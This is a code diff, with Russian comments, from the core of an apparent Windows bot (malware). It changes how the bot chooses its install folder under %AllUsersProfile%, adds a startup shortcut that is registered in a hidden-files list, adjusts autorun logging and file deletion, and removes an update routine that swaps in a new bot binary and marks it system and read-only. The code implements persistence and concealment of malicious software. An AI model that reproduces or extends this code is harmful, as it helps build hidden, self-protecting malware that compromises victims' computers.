@@ -42,7 +42,12 @@ class TBotData : public TBotObject
 public:
 	TProcessType ProcessType;  // Тип запущенного процесса
 
-	// Данные для работы сервиса
+
+	string  BotPath;     // Каталог бота
+	string  BotExeName;  // Полное имя ехе бота
+	string  BotShortLinkName; // Имя файла ярлыка
+
+    // Данные для работы сервиса
 	string                ServiceName;
 	SERVICE_TABLE_ENTRYA  ServiceTable[1];
 	SERVICE_STATUS        ServiceStatus;
@@ -117,7 +122,7 @@ TBotApplication::TBotApplication()
 	FApplicationName = Buf.AsStr();
 
 	// Генерируем рабочие пути
-	FWorkPath = MakeWorkPath(false);
+	FWorkPath = MakeWorkPath();
 
 	// Получаем идентификатор бота
 	FUID = GenerateBotID2();
@@ -335,16 +340,10 @@ string TBotApplication::MakeWorkPath(bool SystemPath)
 //----------------------------------------------------------------------------
 */
 
-string TBotApplication::MakeWorkPath(bool SystemPath)
+string TBotApplication::MakeWorkPath()
 {
 	// Функция генерирует рабочий путь
-	string Result;
-
-	TMemory Path(MAX_PATH);
-	if (!pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
-		return Result;
-
-	Result =  Path.AsStr();
+	string Result = BOT::GetBotPath();
 	Result += GetWorkFolder();
 	Result += "\\";
 
@@ -432,7 +431,14 @@ namespace BOT
 	bool DeleteBotFile( const char* FileName, DWORD TimeOut, bool DeleteAfterReboot )
 	{
 		// Удаляем файл
-		pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL );
+		if (!pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL ))
+		{
+			DWORD Err = pGetLastError();
+			// Если файл не сущестует озращаем истину
+			if (Err == ERROR_FILE_NOT_FOUND)
+				return true;
+		}
+
 		DWORD Start = (DWORD)pGetTickCount();
 		BOOL Deleted = FALSE;
 		do
@@ -459,7 +465,7 @@ namespace BOT
 			Deleted = (BOOL)pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 		}
 
-		return Deleted;
+		return Deleted != FALSE;
 	}
     //----------------------------------------------------------------------
 
@@ -625,8 +631,30 @@ void BOT::InitializeApi()
 	// Инициализируем апи
 	InitializeAPI();
 }
-
 //----------------------------------------------------------------------------
+
+//----------------------------------------------------
+// GetBotPath - Имя крневого каталога бота
+//              В этом каталоге будут лежать самые
+//              выжные файлы бота.
+//  Для некритичных, временных и других файлов
+//  использовать GetWorkPath()
+//----------------------------------------------------
+string BOT::GetBotPath()
+{
+	if (BotData->BotPath.IsEmpty())
+	{
+		// Создаём путь
+		TMemory Path(MAX_PATH);
+		if (pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
+		{
+			BotData->BotPath =  Path.AsStr();
+        }
+    }
+	return BotData->BotPath;
+}
+//----------------------------------------------------------------------------
+
 PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
 {
 	//  Функция возвращает рабочий путь бота
@@ -694,10 +722,28 @@ PCHAR BOT::GetBotExeName()
 
 		// Добавляем имя в список скрываемых фалов
 		AddHiddenFile(BotExeNameHash);
+		GetBotLinkName(); // Добавляем имя ярлыка в список скрываемых файлов
 	}
 
 
 	return CryptedBotExeName;
+}
+//----------------------------------------------------------------------------
+
+//----------------------------------------------------
+//  GetBotLinkName - Функция возвращает имя файла
+//     				 ярлыка бота
+//----------------------------------------------------
+string BOT::GetBotLinkName()
+{
+	if (BotData->BotShortLinkName.IsEmpty())
+	{
+		PCHAR Link = UIDCrypt::CryptFileName(GetStr(EStrBotStartupLinkName).t_str(), false);
+		BotData->BotShortLinkName = Link;
+		AddHiddenFile(Link);
+		STR::Free(Link);
+    }
+	return BotData->BotShortLinkName;
 }
 //----------------------------------------------------------------------------
 
@@ -711,8 +757,13 @@ DWORD BOT::GetBotExeNameHash()
 
 string BOT::GetBotFullExeName()
 {
-	//  Функция возвращает полное имя файла бота
-	return GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
+	if (BotData->BotExeName.IsEmpty())
+	{
+		BotData->BotExeName = GetBotPath();
+        BotData->BotExeName += GetBotExeName();
+	}
+    return BotData->BotExeName;
+   //	return GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
 }
 //----------------------------------------------------------------------------
 
@@ -787,7 +838,7 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 	if (StrSame(FileName, BotFile.t_str(), false, 0))
 		return 0;
 
-	COREDBG("Core", "Добавляем бот в автозагрузку.");
+	COREDBG("Core", "Добавляем бот в автозагрузку. FileName = %s", BotFile.t_str());
 
     // Снимаем системные атрибуты
 	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_NORMAL);
@@ -1140,61 +1191,6 @@ TBotType BOT::GetBotType()
 }
 //----------------------------------------------------------------------------
 
-//----------------------------------------------------
-//  MakeUpdate - функция обновляет бота
-//----------------------------------------------------
-bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
-{
-	if (!File::IsExists((PCHAR)FileName)) return false;
-
-    COREDBG("MakeUpdate", "Устанавливаем новую версию бота");
-
-	string BotFile = GetBotFullExeName();
-
-	if (BotFile.IsEmpty()) return false;
-
-	// При необходимости удалем сохранённые настройки
-	if (ResetSettings)
-		DeleteSettings();
-
-	// Удаляем текущую версию бота
-	if (FileExistsA(BotFile.t_str()))
-	{
-		COREDBG("MakeUpdate", "Удаляем старый файл");
-		Unprotect();
-		pSetFileAttributesA( BotFile.t_str(), FILE_ATTRIBUTE_ARCHIVE );
-
-		// Удаляем старый файл
-		while (1)
-		{
-			if (pDeleteFileA(BotFile.t_str())) break;
-            pSleep(100);
-        }
-	}
-
-    // инсталируем сервис
-	UpdateService(FileName);
-
-	// Перемещаем файл
-	bool Result = pMoveFileExA(FileName, BotFile.t_str(), MOVEFILE_REPLACE_EXISTING ) != 0;
-	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
-
-
-	/* TODO :
-		В данной ветке, при обновлении бота, не запускаем новый экземпляр.
-		В дальнейшем необходимо  проработать методику "горячего" старта бота
-	*/
-
-	BOT::Protect(BotFile.t_str());
-
-//	RunFileA(BotPath);
-//	pExitProcess(1);
-
-	if (Result)
-    	COREDBG("MakeUpdate", "Новый бот успешно установлен");
-
-	return Result;
-}
 
 #ifdef BOTPLUG
 // Функция обновляет тело bot.plug
